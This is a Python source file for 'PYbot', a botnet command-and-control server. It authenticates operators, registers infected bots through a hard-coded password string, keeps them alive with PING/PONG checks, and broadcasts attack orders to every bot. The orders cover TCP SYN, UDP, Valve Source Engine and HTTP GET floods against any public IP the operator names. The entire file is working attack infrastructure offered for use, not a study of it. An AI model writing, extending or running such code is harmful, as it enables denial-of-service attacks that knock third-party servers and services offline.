# PYbot - A simple Python botnet
# Author: WodX
# Date: 27/09/2019
# CnC server

import socket
import threading
import sys
import time
import ipaddress
from colorama import Fore, init

class Bot:
    def __init__(self, connection, ip, port, protocol):
        self.connection = connection
        self.ip = ip
        self.port = port
        self.protocol = protocol

bots = {}
ansi_clear = '\033[2J\033[H'

banner = '''
               {0}██████{1}╗ {0}██{1}╗   {0}██{1}╗{0}██████{1}╗  {0}██████{1}╗ {0}████████{1}╗
               {0}██{1}╔══{0}██{1}╗╚{0}██{1}╗ {0}██{1}╔╝{0}██{1}╔══{0}██{1}╗{0}██{1}╔═══{0}{0}██{1}╗╚══{0}██{1}╔══╝
               {0}██████{1}╔╝ ╚{0}████{1}╔╝ {0}██████{1}╔╝{0}██{1}║   {0}██{1}║   {0}██{1}║   
               {0}██{1}╔═══╝   ╚{0}██{1}╔╝  {0}██{1}╔══{0}██{1}╗{0}██{1}║   {0}██{1}║   {0}██{1}║   
               {0}██{1}║        {0}██{1}║   {0}██████{1}╔╝╚{0}██████{1}╔╝   {0}██{1}║   
               {1}╚═╝        ╚═╝   ╚═════╝  ╚═════╝    ╚═╝
        '''.format(Fore.MAGENTA, Fore.LIGHTWHITE_EX)

def valid(ip):
    groups = ip.split('.')
    if len(groups) != 4 or any(not x.isdigit() for x in groups) or not all(0 <= int(part) < 256 for part in groups) or ipaddress.ip_address(ip).is_private:
        return False
    return True
    
def find_login(username, password):
    for x in open('logins.txt').readlines():
        x = x.strip()
        if x.split(':')[0].lower() == username.lower() and x.split(':')[1] == password:
            return True

def send(socket, data, escape=True):
    data += Fore.RESET
    if escape:
        data += '\r\n'
    socket.send(str.encode(data))

def broadcast(data):
    dead_bots = []
    for bot in bots.keys():
        try:
            send(bot, data, False)
        except:
            dead_bots.append(bot)
        
    for bot in dead_bots:
        bots.pop(bot)
        bot.close()

def ping():
    while 1:
        dead_bots = []
        for bot in bots.keys():
            try:
                bot.settimeout(3)
                send(bot, 'PING', False)
                if bot.recv(1024).decode() != 'PONG':
                    dead_bots.append(bot)
            except:
                dead_bots.append(bot)
            
        for bot in dead_bots:
            bots.pop(bot)
            bot.close()
        time.sleep(5)

def update_title(client, username):
    while 1:
        try:
            send(client, f'\33]0;PYbot | Bots: {len(bots)} | Connected as: {username}\a', False)
            time.sleep(2)
        except:
            client.close()

def command_line(client):
    for x in banner.split('\n'):
        send(client, x)

    prompt = f'{Fore.MAGENTA}PYbot {Fore.LIGHTWHITE_EX}$ '
    send(client, prompt, False)

    while 1:
        try:
            data = client.recv(1024).decode().strip()
            if not data:
                continue

            args = data.split(' ')
            prefix = args[0].upper()
            
            if prefix == 'HELP' or prefix == '?':
                send(client, 'HELP: Shows list of commands')
                send(client, 'METHODS: Shows list of attack methods')
                send(client, 'CLEAR: Clears the screen')
                send(client, 'EXIT: Disconnects from CnC server')
                send(client, '')

            elif prefix == 'METHODS':
                send(client, '.syn: TCP SYN flood')
                send(client, '.vse: Valve Source Engine specific flood')
                send(client, '.udp: UDP flood')
                send(client, '.http: HTTP GET request flood')
                send(client, '')

            elif prefix == 'CLS' or prefix == 'CLEAR':
                send(client, ansi_clear, False)
                for x in banner.split('\n'):
                    send(client, x)

            elif prefix == 'EXIT' or prefix == 'LOGOUT':
                send(client, 'Goodbye :-)')
                time.sleep(1)
                break

            # Valve Source Engine Attack Vector
            elif prefix == '.VSE':
                if len(args) == 3:
                    ip = args[1]
                    secs = args[2]
                    if valid(ip):
                        if secs.isdigit() and int(secs) >= 10 or int(secs) <= 1300:
                            send(client, Fore.GREEN + f'Attack was sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                            broadcast(data)
                        else:
                            send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .vse [IP] [TIME]')

            # TCP SYN attack vector
            elif prefix == '.SYN':
                if len(args) == 3:
                    ip = args[1]
                    secs = args[2]
                    if valid(ip):
                        if secs.isdigit() and int(secs) >= 10 or int(secs) <= 1300:
                            send(client, Fore.GREEN + f'Attack was sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                            broadcast(data)
                        else:
                            send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .syn [IP] [TIME]')

            # UDP attack vector
            elif prefix == '.UDP':
                if len(args) == 4:
                    ip = args[1]
                    secs = args[2]
                    size = args[3]
                    if valid(ip):
                        if secs.isdigit() and int(secs) >= 10 and int(secs) <= 1300:
                            if size.isdigit() and int(size) >= 64 and int(size) <= 65500:
                                send(client, Fore.GREEN + f'Attack was sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                                broadcast(data)
                            else:
                                send(client, Fore.RED + 'Invalid packet size (64-65500 bytes)')
                        else:
                            send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .udp [IP] [TIME] [SIZE]')

            # HTTP GET attack vector
            elif prefix == '.HTTP':
                if len(args) == 3:
                    ip = args[1]
                    secs = args[2]
                    if valid(ip):
                        if secs.isdigit() and int(secs) >= 10 or int(secs) <= 1300:
                            send(client, Fore.GREEN + f'Attack was sent to {len(bots)} {"bots" if len(bots) != 1 else "bot"}')
                            broadcast(data)
                        else:
                            send(client, Fore.RED + 'Invalid attack duration (10-1300 seconds)')
                    else:
                        send(client, Fore.RED + 'Invalid IP-address')
                else:
                    send(client, 'Usage: .http [IP] [TIME]')

            else:
                send(client, Fore.RED + 'Unknown Command')

            send(client, prompt, False)
        except:
            break
    client.close()

def handle_client(client, address):

    send(client, f'\33]0;PYbot | Login\a', False)

    # username login
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.MAGENTA}Username{Fore.LIGHTWHITE_EX}: ', False)
        username = client.recv(1024).decode().strip()
        if not username:
            continue
        break

    # password login
    password = ''
    while 1:
        send(client, ansi_clear, False)
        send(client, f'{Fore.MAGENTA}Password{Fore.LIGHTWHITE_EX}: ', False)
        while not password.strip():
            password = client.recv(1024).decode().strip()
        break
 
    if password != 'ÿÿÿÿU':
        send(client, ansi_clear, False)

        # handle client
        if not find_login(username, password):
            send(client, Fore.RED + 'Invalid credentials')
            time.sleep(1)
            client.close()
            return

        threading.Thread(target=update_title, args=(client, username)).start()
        threading.Thread(target=command_line, args=[client]).start()
        return

    # handle bot
    for x in bots.values():
        if x[0] == address[0]:
            client.close()
            return
    bots.update({client: address})
    
def main():
    if len(sys.argv) != 2:
        print(f'Usage: python {sys.argv[0]} <cnc port>')
        exit()

    port = sys.argv[1]
    if not port.isdigit() or int(port) < 1 or int(port) > 65535:
        print('Invalid CnC port')
        exit()
    port = int(port)
    
    init(convert=True)

    sock = socket.socket()
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        sock.bind(('0.0.0.0', port))
        sock.listen()
    except:
        print('Couldn\'t bind port')
        exit()

    threading.Thread(target=ping).start()

    while 1:
        threading.Thread(target=handle_client, args=[*sock.accept()]).start()

if __name__ == '__main__':
    main()